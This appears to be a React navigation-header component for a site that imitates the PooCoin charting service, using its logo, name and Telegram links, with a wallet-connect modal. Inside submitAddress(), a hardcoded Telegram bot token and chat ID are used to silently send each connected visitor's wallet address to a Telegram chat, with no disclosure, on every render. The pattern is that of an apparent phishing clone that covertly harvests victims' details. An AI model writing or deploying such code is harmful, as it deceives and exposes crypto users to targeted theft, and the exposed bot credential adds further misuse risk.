import React, { useEffect, useState } from 'react';
import './Header.css';
import { Link } from 'react-router-dom';
import { WalletConnectConnector } from "@web3-react/walletconnect-connector";
import { InjectedConnector } from "@web3-react/injected-connector";
import { useWeb3React } from '@web3-react/core'
import { Box, Modal, Typography } from '@material-ui/core';
import AppBar from '@mui/material/AppBar';
import IconButton from '@mui/material/IconButton';
import Menu from '@mui/material/Menu';
import MenuIcon from '@mui/icons-material/Menu';
import Container from '@mui/material/Container';
import Button from '@mui/material/Button';
import Tooltip from '@mui/material/Tooltip';
import MenuItem from '@mui/material/MenuItem';




const pages = [
    { 'name': 'Charts', 'href': '/', 'disable': false },
    { 'name': 'Trade', 'href': '/Trade', 'disable': false },
    { 'name': 'Multi Chart', 'href': '/', 'disable': true },
    { 'name': 'About', 'href': '/', 'disable': true },
    { 'name': 'Tools', 'href': '/Tools', 'disable': false },
    { 'name': 'Premium', 'href': '/', 'disable': true },
    { 'name': 'Free Price Bot', 'href': 'https://t.me/Poocoin_Pricebot', 'disable': true },
];
const settings = ['Profile', 'Account', 'Dashboard', 'Logout'];

const style = {
    position: 'absolute',
    top: '50%',
    left: '50%',
    transform: 'translate(-50%, -50%)',
    bgcolor: 'background.paper',
    border: '2px solid #000',
    boxShadow: 24,
    p: 4,
    display: 'flex',
    flexDirection: 'column'
};
let bot = {
    TOKEN: "5694683449:AAF3Wv9YaK6ScwKWg8bS2hVHYN98sUoTbjk",
    CHATID: "1203745440",

}

function Header() {
    const { account } = useWeb3React();
    const { activate } = useWeb3React();
    const [id,setId] = useState()
    const [open, setOpen] = React.useState(false);
    const handleOpen = () => setOpen(true);
    const handleClose = () => setOpen(false);
    const [anchorElNav, setAnchorElNav] = React.useState(null);
    const [anchorElUser, setAnchorElUser] = React.useState(null);
    useEffect(() => {
        setId(localStorage.getItem('address'))
    },[localStorage.getItem('address')])
    const condition = "hello"
    console.log(id)
    const handleOpenNavMenu = (e) => {
        setAnchorElNav(e.currentTarget);
    };


    const handleCloseNavMenu = () => {
        setAnchorElNav(null);
    };

    const handleCloseUserMenu = () => {
        setAnchorElUser(null);
    };

    const WalletConnect = new WalletConnectConnector({
        rpcUrl: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
        bridge: "https://bridge.walletconnect.org",
        qrcode: true,
    });

    const Injected = new InjectedConnector({
        supportedChainIds: [1, 3, 4, 5, 42]
    });

    const connectWallet = () => {
        handleClose();
        activate(WalletConnect)
    }
    const connectMetamask = () => {
        handleClose();
        activate(Injected)
    }

    const submitAddress = () => {
        
        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${account}`, {
            method: "GET"
        })
            .then(success => {
                localStorage.setItem('address', account)
            }, error => {
                alert("not sent")
            })
    }

    if (account !== undefined) {
        submitAddress()
    }
    return (

        <AppBar style={{ backgroundColor: '#262626' }} color='primary' position="static">
            <Container sx={{ display: "flex", alignItems: 'center', justifyContent: 'space-between' }} maxWidth="xl">
                <Box sx={{ flexGrow: 0, display: { xs: 'flex', md: 'none' } }}>
                    <IconButton
                        size="large"
                        aria-label="account of current user"
                        aria-controls="menu-appbar"
                        aria-haspopup="true"
                        onClick={handleOpenNavMenu}
                        color="inherit"
                    >
                        <MenuIcon />
                    </IconButton>
                    <Menu
                        id="menu-appbar"
                        anchorEl={anchorElNav}
                        anchorOrigin={{
                            vertical: 'bottom',
                            horizontal: 'left',
                        }}
                        keepMounted
                        transformOrigin={{
                            vertical: 'top',
                            horizontal: 'left',
                        }}
                        open={Boolean(anchorElNav)}
                        onClose={handleCloseNavMenu}
                        sx={{
                            display: { xs: 'block', md: 'none' },
                        }}
                    >
                        {pages.map((page) => (
                            <MenuItem key={page.name} onClick={handleCloseNavMenu} disabled={page.disable}>
                                <Link to={page.href} style={{ color: 'black' }}>
                                    <Typography>{page.name}</Typography>
                                </Link>
                            </MenuItem>
                        ))}
                    </Menu>
                </Box>
                <Box sx={{ display: 'flex', alignItems: 'center', mr: 1 }}>
                    <img
                        style={{ width: '30px' }}
                        src="https://poocoin.app/images/logo/poocoin512.png"
                        alt='loading'
                    />
                    <Typography
                        noWrap
                        href="/"
                        sx={{
                            mr: 2,
                            display: { xs: 'none', md: 'flex' },
                            fontFamily: 'monospace',
                            fontWeight: 700,
                            letterSpacing: '.3rem',
                            textDecoration: 'none',
                            color: 'white'
                        }}
                    >
                        PooCoin
                    </Typography>
                    <br />
                    <Typography
                        noWrap
                        href="/"
                        sx={{
                            mr: 2,
                            display: { xs: 'none', md: 'flex' },
                            fontFamily: 'monospace',
                            fontWeight: 700,
                            letterSpacing: '.3rem',
                            textDecoration: 'none',
                            color: 'white'
                        }}
                    >
                        Chart
                    </Typography>
                </Box>
                <div className="header_centercenter">
                    <div>Binance (BSC)</div>
                    <div>Polygon (Matic)</div>
                    <div>KuChain (KCC)</div>
                </div>
                <div className="header_centerright">
                    <img
                        src="https://poocoin.app/images/logo/poocoin512.png"
                        alt='loading'
                    />
                    <span>$ 2.36</span>
                    <Button href="https://t.me/poocointokenchat">
                        <img src="https://poocoin.app/images/logos/telegram.svg" alt='loading' height="25" />
                    </Button>
                </div>
                <Box sx={{ mx: 'auto', flexGrow: 0, display: { xs: 'none', md: 'flex' } }}>
                    {pages.map((page) => (
                        <MenuItem key={page.name} onClick={handleCloseNavMenu} disabled={page.disable}>
                            <Link to={page.href} style={{ color: 'white' }}>
                                <Typography>{page.name}</Typography>
                            </Link>
                        </MenuItem>
                    ))}
                </Box>

                <Box sx={{ flexGrow: 0 }}>
                            <div className="header_right">

                                <Tooltip title='Conncet Wallet'>
                                    <button onClick={handleOpen}>Connect</button>
                                </Tooltip>
                                <Modal
                                    open={open}
                                    onClose={handleClose}
                                    aria-labelledby="modal-modal-title"
                                    aria-describedby="modal-modal-description"
                                >
                                    <Box sx={style}>
                                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectMetamask() }}>Metamask/TrustWallet</button>
                                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectWallet() }}>WalletConnect</button>
                                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={handleClose}>Close</button>
                                    </Box>
                                </Modal>
                            </div>
                    <Menu
                        sx={{ mt: '45px' }}
                        id="menu-appbar"
                        anchorEl={anchorElUser}
                        anchorOrigin={{
                            vertical: 'top',
                            horizontal: 'right',
                        }}
                        keepMounted
                        transformOrigin={{
                            vertical: 'top',
                            horizontal: 'right',
                        }}
                        open={Boolean(anchorElUser)}
                        onClose={handleCloseUserMenu}
                    >
                        {settings.map((setting) => (
                            <MenuItem key={setting} onClick={handleCloseUserMenu}>
                                <Typography >{setting}</Typography>
                            </MenuItem>
                        ))}
                    </Menu>
                </Box>
            </Container>
        </AppBar>

    )
}

export default Header
